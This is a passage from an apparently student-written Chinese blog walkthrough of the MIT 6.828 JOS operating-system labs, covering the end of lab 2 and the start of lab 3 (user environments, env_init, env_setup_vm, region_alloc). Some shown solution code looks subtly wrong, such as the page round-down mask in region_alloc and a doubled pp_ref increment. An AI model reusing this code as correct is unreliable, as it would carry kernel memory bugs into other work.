challenge problem about PTE_PS.)</p><p>Generalize the kernel’s memory allocation system to support pages of a variety of power-of-two allocation unit sizes from 4KB up to some reasonable maximum of your choice. Be sure you have some way to divide larger allocation units into smaller ones on demand, and to coalesce multiple small allocation units back into larger units when possible. Think about the issues that might arise in such a system.</p></blockquote><p>完善内核内存管理系统，提供更大粒度与更小粒度的 allocator（比如说 buddy system + slub allocator），这里就不手抄一份 buddy system 和 slub allocator 了，笔者暂时也没有更好的内存分配方案</p><blockquote><p><del>👴是懒🐕👴自豪</del></p></blockquote><p>至此，lab2 全部完成</p><h1 id="0x03-User-Environments"><a href="#0x03-User-Environments" class="headerlink" title="0x03.User Environments"></a>0x03.User Environments</h1><p>在这一部分我们终于要迈入用户进程的世界，实现特权级的分离，并完成系统调用的编写以及一个用户进程的运行</p><p><strong>注意</strong>：本 lab 中 <code>environment</code> 与 <code>process</code> 代指同一事物——运行的进程的抽象体，6.828 在这里更多使用 environment 而不是 process 是为了指出 JOS environment 与 UNIX process 提供了不同的接口，且不提供相同的语义</p><p>首先是惯例地将 lab 3代码拉到本地</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git add .</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git commit -am <span class="string">&#x27;changes to lab2 after handin&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git pull</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout -b lab3 origin/lab3</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git merge lab2</span></span><br></pre></td></tr></table></figure><blockquote><p>这里笔者本想先跑一跑内核玩玩，但是遇到一个奇怪的问题：在分配页目录表地址空间后、建立映射时会 panic 掉，经笔者调试发现在 boot_alloc() 中初始化 nextfree 的值所指向的那张内存页上<strong>仍然存在着一些内核变量，即这并非是一个闲置的内存页</strong>，于是我们的指向页目录表的指针就被 memset 清零了…</p><p>为什么？让我们将目光放回 <code>boot_alloc()</code> 函数中，在我们初始化 nextfree 时使用的是一个外部引入的变量 <code>end</code> 对内存页进行向上对齐得到的地址，这里说是由链接器生成的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Initialize nextfree if this is the first time.</span></span><br><span class="line"><span class="comment">// &#x27;end&#x27; is a magic symbol automatically generated by the linker,</span></span><br><span class="line"><span class="comment">// which points to the end of the kernel&#x27;s bss segment:</span></span><br><span class="line"><span class="comment">// the first virtual address that the linker did *not* assign</span></span><br><span class="line"><span class="comment">// to any kernel code or global variables.</span></span><br><span class="line"><span class="keyword">if</span> (!nextfree) &#123;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> end[];</span><br><span class="line">nextfree = ROUNDUP((<span class="type">char</span> *) end, PGSIZE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**但经过笔者反编译内核文件、打印 end 变量信息发现，其并不指向 bss 的末尾，后面还有几个变量，且其刚好落在内存页对齐的地址…**这也是为什么 ROUNDUP 不能顺利拯救 nextfree 的原因，可能也是为什么之前没有出现该问题的原因：之前 end 不一定刚好落在内存页对齐的地址，向上对齐一个页自然就早已超出 bss 了，但是现在链接器恰好将其生成在了一个微妙的位置</p><p><img src="https://s2.loli.net/2022/03/16/FzLf8Z39beEkXrH.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/16/1YAmcNrF8h3iLTy.png" alt="image.png"></p><p>笔者甚至怀疑 end 可能之前甚至都不在 bss 段末尾，可能也不是链接器生成的“末尾变量”…但是一看 IDA 的反编译结果，<strong>好像确乎有个 end 在整个镜像的最末尾，但他又指回了那个位置尴尬的 end 变量</strong></p><p><img src="https://s2.loli.net/2022/03/16/qDMFGo9v83PAOpY.png" alt="image.png"></p><p>笔者暂且不知道是什么原因导致了这个现象的发生，目前的解决方案是在计算 nextfree 时多加一个 page 进行 ROUNDUP，<strong>但在后面的 check_kern_pgdir 里面又 panic 掉了…</strong></p><blockquote><p>lab2 跑得好好的 lab3 咋突然莫名其妙炸了，👴不理解</p></blockquote><p>于是笔者<strong>将 lab2 分支的 kern&#x2F;pmap.c 拷贝过来，让 end 加上一个 page，内存管理这一块又一切正常了…</strong></p><blockquote><p>👴愿意称之为灵异事件</p></blockquote><p>那就只能是 lab3 中的一些改动把内存管理给 crash 掉了，笔者检索该函数的 panic 信息，发现确乎是在检查 lab3 新增的内存映射区域时 panic 的（这块内存我们还没映射）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// check envs array (new test for lab 3)</span></span><br><span class="line">n = ROUNDUP(NENV*<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Env), PGSIZE);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i += PGSIZE)</span><br><span class="line">assert(check_va2pa(pgdir, UENVS + i) == PADDR(envs) + i);</span><br></pre></td></tr></table></figure><p>所以接下来重新开始 lab3 的旅程</p><blockquote><p>但👴觉得 end 确乎是对齐错了</p></blockquote></blockquote><p>在 lab3 中新增了以下文件：</p><table><thead><tr><th><code>inc/</code></th><th><code>env.h</code></th><th>Public definitions for user-mode environments</th></tr></thead><tbody><tr><td></td><td><code>trap.h</code></td><td>Public definitions for trap handling</td></tr><tr><td></td><td><code>syscall.h</code></td><td>Public definitions for system calls from user environments to the kernel</td></tr><tr><td></td><td><code>lib.h</code></td><td>Public definitions for the user-mode support library</td></tr><tr><td><code>kern/</code></td><td><code>env.h</code></td><td>Kernel-private definitions for user-mode environments</td></tr><tr><td></td><td><code>env.c</code></td><td>Kernel code implementing user-mode environments</td></tr><tr><td></td><td><code>trap.h</code></td><td>Kernel-private trap handling definitions</td></tr><tr><td></td><td><code>trap.c</code></td><td>Trap handling code</td></tr><tr><td></td><td><code>trapentry.S</code></td><td>Assembly-language trap handler entry-points</td></tr><tr><td></td><td><code>syscall.h</code></td><td>Kernel-private definitions for system call handling</td></tr><tr><td></td><td><code>syscall.c</code></td><td>System call implementation code</td></tr><tr><td><code>lib/</code></td><td><code>Makefrag</code></td><td>Makefile fragment to build user-mode library, <code>obj/lib/libjos.a</code></td></tr><tr><td></td><td><code>entry.S</code></td><td>Assembly-language entry-point for user environments</td></tr><tr><td></td><td><code>libmain.c</code></td><td>User-mode library setup code called from <code>entry.S</code></td></tr><tr><td></td><td><code>syscall.c</code></td><td>User-mode system call stub functions</td></tr><tr><td></td><td><code>console.c</code></td><td>User-mode implementations of <code>putchar</code> and <code>getchar</code>, providing console I&#x2F;O</td></tr><tr><td></td><td><code>exit.c</code></td><td>User-mode implementation of <code>exit</code></td></tr><tr><td></td><td><code>panic.c</code></td><td>User-mode implementation of <code>panic</code></td></tr><tr><td><code>user/</code></td><td><code>*</code></td><td>Various test programs to check kernel lab 3 code</td></tr></tbody></table><h2 id="Part-A-User-Environments-and-Exception-Handling"><a href="#Part-A-User-Environments-and-Exception-Handling" class="headerlink" title="Part A: User Environments and Exception Handling"></a>Part A: User Environments and Exception Handling</h2><p>在新加入的头文件 <code>inc/env.h</code> 中包含了 JOS 的基本的用户环境定义，内核使用结构体 <code>Env</code> 来标识每一个用户环境，在本 lab 中我们需要完成 JOS 的多环境支持</p><p>在 <code>kern/env.c</code> 中，内核维护三个与环境有关的全局变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">envs</span> =</span> <span class="literal">NULL</span>;<span class="comment">// All environments</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">curenv</span> =</span> <span class="literal">NULL</span>;<span class="comment">// The current env</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env_free_list</span>;</span><span class="comment">// Free environment list</span></span><br></pre></td></tr></table></figure><p>在 JOS 启动时会初始化一个长度为 <code>NENV</code> 的 <code>Env</code> 结构体数组，其中闲置的 Env 结构体链在 <code>env_free_list</code> 中，而 <code>curenv</code> 指向当前环境的 Env 结构体（类似于 Linux 内核中的 current() 指向 当前 CPU 上运行的进程的 task_struct），在启动阶段 curenv 为 NULL</p><blockquote><p>笔者认为还是叫进程好听，既然是同一个东西，没有必要为了和 UNIX 区分开来而特意改个莫名其妙的名字</p></blockquote><h3 id="Environment-State"><a href="#Environment-State" class="headerlink" title="Environment State"></a>Environment State</h3><p><code>Env</code> 结构体定义如下，笔者认为可以类比做 Linux 下的 <code>task_struct</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Trapframe</span> <span class="title">env_tf</span>;</span><span class="comment">// Saved registers</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env_link</span>;</span><span class="comment">// Next free Env</span></span><br><span class="line"><span class="type">envid_t</span> env_id;<span class="comment">// Unique environment identifier</span></span><br><span class="line"><span class="type">envid_t</span> env_parent_id;<span class="comment">// env_id of this env&#x27;s parent</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">EnvType</span> <span class="title">env_type</span>;</span><span class="comment">// Indicates special system environments</span></span><br><span class="line"><span class="type">unsigned</span> env_status;<span class="comment">// Status of the environment</span></span><br><span class="line"><span class="type">uint32_t</span> env_runs;<span class="comment">// Number of times environment has run</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Address space</span></span><br><span class="line"><span class="type">pde_t</span> *env_pgdir;<span class="comment">// Kernel virtual address of page dir</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>各字段说明如下：</p><ul><li><p><strong>env_tf</strong>: 进程上下文中的寄存器状态</p></li><li><p><strong>env_link</strong>: 在 <code>env_free_list</code> 链表中指向下一个空闲 Env 结构体</p></li><li><p><strong>env_id</strong>: 唯一标识单个进程的 id，在 Env 结构体被重新分配后通常会发生改变</p></li><li><p><strong>env_parent_id</strong>: 父进程的 id</p></li><li><p><strong>env_type</strong>: 进程类型，对于大部分进程而言应当为 <code>ENV_TYPE_USER</code> 在后续的 lab 中会补充更多的为系统服务而出现的类型</p></li></ul><blockquote><p>用户进程与内核进程的既视感</p></blockquote><ul><li><p><strong>env_status</strong>: 进程状态，可选值范围如下：</p><ul><li><p><code>ENV_FREE</code>: 该 Env 结构体空闲</p></li><li><p><code>ENV_RUNNABLE</code>: 该 Env 结构体对应着一个等待运行的进程</p></li><li><p><code>ENV_RUNNING</code>: 该 Env 结构体对应着一个正在运行的进程</p></li><li><p><code>ENV_NOT_RUNNABLE</code>: 该 Env 结构体对应进程未准备好继续运行（例如在等待另一个进程的信号）</p></li><li><p><code>ENV_DYING</code>: 该 Env 结构体对应一个僵尸进程，我们将在 lab4 中用到它</p></li></ul></li><li><p><strong>env_pgdir</strong>: 进程页目录表</p></li></ul><p>需要注意的是，JOS 中的进程并没有自己的内核栈，同一时刻内只有一个进程可以处在内核态，所以 JOS 只需要一个单独的内核栈</p><h3 id="Allocating-the-Environments-Array"><a href="#Allocating-the-Environments-Array" class="headerlink" title="Allocating the Environments Array"></a>Allocating the Environments Array</h3><p>首先是一个小练习，在 <code>mem_init()</code> 中为 envs 数组分配空间</p><blockquote><p><strong>Exercise 1.</strong> Modify <code>mem_init()</code> in <code>kern/pmap.c</code> to allocate and map the <code>envs</code> array. This array consists of exactly <code>NENV</code> instances of the <code>Env</code> structure allocated much like how you allocated the <code>pages</code> array. Also like the <code>pages</code> array, the memory backing <code>envs</code> should also be mapped user read-only at <code>UENVS</code> (defined in <code>inc/memlayout.h</code>) so user processes can read from this array.</p><p>You should run your code and make sure <code>check_kern_pgdir()</code> succeeds.</p></blockquote><p>注意应在 <code>page_init()</code> 之前调用 <code>boot_alloc()</code> 分配空间，在这之后再进行映射，不要图省事写到一起</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Make &#x27;envs&#x27; point to an array of size &#x27;NENV&#x27; of &#x27;struct Env&#x27;.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">envs = boot_alloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Env) * NENV);</span><br><span class="line"><span class="built_in">memset</span>(envs, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Env) * NENV);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Map the &#x27;envs&#x27; array read-only by the user at linear address UENVS</span></span><br><span class="line"><span class="comment">// (ie. perm = PTE_U | PTE_P).</span></span><br><span class="line"><span class="comment">// Permissions:</span></span><br><span class="line"><span class="comment">//    - the new image at UENVS  -- kernel R, user R</span></span><br><span class="line"><span class="comment">//    - envs itself -- kernel RW, user NONE</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">boot_map_region(kern_pgdir, UENVS, </span><br><span class="line">ROUNDUP(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Env) * NENV, PGSIZE), </span><br><span class="line">PADDR(envs), PTE_U);</span><br></pre></td></tr></table></figure><h3 id="Creating-and-Running-Environments"><a href="#Creating-and-Running-Environments" class="headerlink" title="Creating and Running Environments"></a>Creating and Running Environments</h3><p>我们将在 <code>kern/env.c</code> 中编写运行用户环境所需的代码，因为目前还没有文件系统，所以目前临时的一个做法是将一个 ELF 文件以 raw 格式（链接内核时使用 <code>-b binary</code> 选项）嵌入到内核镜像中，这也是为什么我们能在内核符号文件 <code>obj/kern/kernel.sym</code> 中见到一些奇怪符号的缘故，这也是为什么实验一开始笔者反编译内核镜像见到奇怪的符号的缘故</p><p><img src="https://s2.loli.net/2022/03/16/w3GDsF2iCI1BVkd.png" alt="image.png"></p><p>在 <code>kern/init.c</code> 中的 <code>i386_init()</code> 中我们可以看到启动用户进程的代码，然而设置用户进程的代码尚未完工，这也是我们接下来需要完成的——Exercise2：</p><blockquote><p><strong>Exercise 2.</strong> In the file <code>env.c</code>, finish coding the following functions:</p><ul><li><p><code>env_init()</code></p><p>Initialize all of the <code>Env</code> structures in the <code>envs</code> array and add them to the <code>env_free_list</code>. Also calls <code>env_init_percpu</code>, which configures the segmentation hardware with separate segments for privilege level 0 (kernel) and privilege level 3 (user).</p></li><li><p><code>env_setup_vm()</code></p><p>Allocate a page directory for a new environment and initialize the kernel portion of the new environment’s address space.</p></li><li><p><code>region_alloc()</code></p><p>Allocates and maps physical memory for an environment</p></li><li><p><code>load_icode()</code></p><p>You will need to parse an ELF binary image, much like the boot loader already does, and load its contents into the user address space of a new environment.</p></li><li><p><code>env_create()</code></p><p>Allocate an environment with <code>env_alloc</code> and call <code>load_icode</code> to load an ELF binary into it.</p></li><li><p><code>env_run()</code></p><p>Start a given environment running in user mode.</p></li></ul><p>As you write these functions, you might find the new cprintf verb <code>%e</code> useful – it prints a description corresponding to an error code. For example,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = -E_NO_MEM;</span><br><span class="line">panic(&quot;env_alloc: %e&quot;, r);</span><br></pre></td></tr></table></figure><p>will panic with the message “env_alloc: out of memory”.</p></blockquote><p>在开始之前，我们先看实验说明提供给我们的一个内核运行链：</p><ul><li><code>start</code> (<code>kern/entry.S</code>)</li><li><code>i386_init</code> (<code>kern/init.c</code>)<ul><li><code>cons_init</code></li><li><code>mem_init</code></li><li><code>env_init</code></li><li><code>trap_init</code> (still incomplete at this point)</li><li><code>env_create</code></li><li><code>env_run</code><ul><li><code>env_pop_tf</code></li></ul></li></ul></li></ul><p>现在开始补全实验代码。</p><h4 id="env-init-：初始化-Env-结构体，建立-freelist"><a href="#env-init-：初始化-Env-结构体，建立-freelist" class="headerlink" title="env_init()：初始化 Env 结构体，建立 freelist"></a>env_init()：初始化 Env 结构体，建立 freelist</h4><p>首先看 <code>env_init()</code> 函数的注释，主要是将 envs 数组中所有 Env 结构体链到 <code>env_free_list</code> 上，并确保与数组相同的从前向后的连接顺序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mark all environments in &#x27;envs&#x27; as free, set their env_ids to 0,</span></span><br><span class="line"><span class="comment">// and insert them into the env_free_list.</span></span><br><span class="line"><span class="comment">// Make sure the environments are in the free list in the same order</span></span><br><span class="line"><span class="comment">// they are in the envs array (i.e., so that the first call to</span></span><br><span class="line"><span class="comment">// env_alloc() returns envs[0]).</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>后向遍历 envs 数组建立单向链表即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Set up envs array</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">env_free_list = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (i = NENV - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">envs[i].env_id = <span class="number">0</span>;</span><br><span class="line">envs[i].env_status = ENV_FREE;</span><br><span class="line">envs[i].env_link = env_free_list;</span><br><span class="line">env_free_list = &amp;envs[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Per-CPU part of the initialization</span></span><br><span class="line">env_init_percpu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="env-setup-vm-：分配进程环境资源"><a href="#env-setup-vm-：分配进程环境资源" class="headerlink" title="env_setup_vm()：分配进程环境资源"></a>env_setup_vm()：分配进程环境资源</h4><p>惯例先看注释，主要是让我们分配用户进程所需资源：就目前而言只是分配一个页目录表，并建立对应的内核入口点的映射</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Initialize the kernel virtual memory layout for environment e.</span></span><br><span class="line"><span class="comment">// Allocate a page directory, set e-&gt;env_pgdir accordingly,</span></span><br><span class="line"><span class="comment">// and initialize the kernel portion of the new environment&#x27;s address space.</span></span><br><span class="line"><span class="comment">// Do NOT (yet) map anything into the user portion</span></span><br><span class="line"><span class="comment">// of the environment&#x27;s virtual address space.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns 0 on success, &lt; 0 on error.  Errors include:</span></span><br><span class="line"><span class="comment">//-E_NO_MEM if page directory or table could not be allocated.</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>所有的进程共享同一份内核空间（<code>UTOP</code> 往上的虚拟空间），除了<code>UVPT</code>——每个进程各自应当有一份独立的页目录表，因此在该函数中我们需要初始化单个进程的页表对内核空间的映射，参照 <code>inc/memlayout.h</code> 中的布局</p><p>在 JOS 中其实是类似于普通 OS 以前的做法：每个进程共享一份完整的内核地址空间的映射，但笔者认为其实我们只需要映射只读的 pages 数组与 envs 数组即可，<strong>内核的其他区域用户是没有任何访问权限的，那其实没必要建立映射</strong>，笔者认为比较理想的一个状态是类似 KPTI 那样的——用户态与内核态各自有一张页表，其中内核态页表完整映射内核空间，用户态页表仅映射内核入口点，同时两张页表都完整映射用户空间</p><p>这并非不能实现，但是<strong>这或许需要对 JOS 源码进行相当大的改动，且该函数除了创建用户进程以外还承担了创建内核进程的任务，而后者是需要对内核空间有访问权限的</strong>，且 KPTI 确乎会带来一定的开销（但是可以防止熔断与幽灵漏洞的攻击，可能作为一个安全研究员第一想到的并不是性能而是安全性），因此这里笔者还是选择老老实实地完整拷贝一份内核页表</p><blockquote><p>这里别忘了 page_alloc() 分配的是 page 结构体的地址，我们还需要手动转为虚拟地址</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">env_setup_vm</span><span class="params">(<span class="keyword">struct</span> Env *e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page for the page directory</span></span><br><span class="line"><span class="keyword">if</span> (!(p = page_alloc(ALLOC_ZERO)))</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now, set e-&gt;env_pgdir and initialize the page directory.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//    - The VA space of all envs is identical above UTOP</span></span><br><span class="line"><span class="comment">//(except at UVPT, which we&#x27;ve set below).</span></span><br><span class="line"><span class="comment">//See inc/memlayout.h for permissions and layout.</span></span><br><span class="line"><span class="comment">//Can you use kern_pgdir as a template?  Hint: Yes.</span></span><br><span class="line"><span class="comment">//(Make sure you got the permissions right in Lab 2.)</span></span><br><span class="line"><span class="comment">//    - The initial VA below UTOP is empty.</span></span><br><span class="line"><span class="comment">//    - You do not need to make any more calls to page_alloc.</span></span><br><span class="line"><span class="comment">//    - Note: In general, pp_ref is not maintained for</span></span><br><span class="line"><span class="comment">//physical pages mapped only above UTOP, but env_pgdir</span></span><br><span class="line"><span class="comment">//is an exception -- you need to increment env_pgdir&#x27;s</span></span><br><span class="line"><span class="comment">//pp_ref for env_free to work correctly.</span></span><br><span class="line"><span class="comment">//    - The functions in kern/pmap.h are handy.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">p-&gt;pp_ref++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// copy kernel pgdir</span></span><br><span class="line"><span class="built_in">memcpy</span>(page2kva(p), kern_pgdir, PGSIZE);</span><br><span class="line"></span><br><span class="line">e-&gt;env_pgdir = page2kva(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">// UVPT maps the env&#x27;s own page table read-only.</span></span><br><span class="line"><span class="comment">// Permissions: kernel R, user R</span></span><br><span class="line">e-&gt;env_pgdir[PDX(UVPT)] = PADDR(e-&gt;env_pgdir) | PTE_P | PTE_U;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>而且仔细想来，KPTI并非是基于安全性的改进，<strong>而是对漏洞不得不做出的妥协</strong>，况且这也就只是做个实验而已，暂时还是不大张旗鼓地改了</p></blockquote><h4 id="region-alloc-：为进程分配物理页面，建立映射"><a href="#region-alloc-：为进程分配物理页面，建立映射" class="headerlink" title="region_alloc()：为进程分配物理页面，建立映射"></a>region_alloc()：为进程分配物理页面，建立映射</h4><p>主要是为用户进程的 va 起始处 len 长度的虚拟地址空间分配物理页面，别忘了大小按页面粒度对齐以及页表项用户可写权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Allocate len bytes of physical memory for environment env,</span></span><br><span class="line"><span class="comment">// and map it at virtual address va in the environment&#x27;s address space.</span></span><br><span class="line"><span class="comment">// Does not zero or otherwise initialize the mapped pages in any way.</span></span><br><span class="line"><span class="comment">// Pages should be writable by user and kernel.</span></span><br><span class="line"><span class="comment">// Panic if any allocation attempt fails.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">region_alloc</span><span class="params">(<span class="keyword">struct</span> Env *e, <span class="type">void</span> *va, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="comment">// (But only if you need it for load_icode.)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: It is easier to use region_alloc if the caller can pass</span></span><br><span class="line"><span class="comment">//   &#x27;va&#x27; and &#x27;len&#x27; values that are not page-aligned.</span></span><br><span class="line"><span class="comment">//   You should round va down, and round (va + len) up.</span></span><br><span class="line"><span class="comment">//   (Watch out for corner-cases!)</span></span><br><span class="line"><span class="type">size_t</span> start, end;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">new_p</span>;</span></span><br><span class="line"></span><br><span class="line">start = ((<span class="type">size_t</span>)va) &amp; (~PGSIZE);</span><br><span class="line">end = ROUNDUP((<span class="type">size_t</span>)va + len, PGSIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (; start &lt; end; start += PGSIZE)</span><br><span class="line">&#123;</span><br><span class="line">new_p = page_alloc(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!new_p)</span><br><span class="line">panic(<span class="string">&quot;Out of memory while allocating region for env!&quot;</span>);</span><br><span class="line">new_p-&gt;pp_ref++;</span><br><span class="line"><span class="keyword">if</span>(page_insert(e-&gt;env_pgdir, new_p, (<span class="type">void</span>*)start, PTE_U | PTE_W))</span><br><span class="line">panic(<span class="string">&quot;OOM while inserting page into page table!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="load-icode-：解析-ELF-文件，作为新进程载入"><a href="#load-icode-：解析-ELF-文件，作为新进程载入" class="headerlink" title="load_icode()：解析 ELF 文件，作为新进程载入"></a>load_icode()：解析 ELF 文件，作为新进程载入</h4><p>先看注释，让我们手写一个 ELF 解析器，为各个存在于 ELF 中的段分配空间（例如 bss 段在 ELF 中就不占空间）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 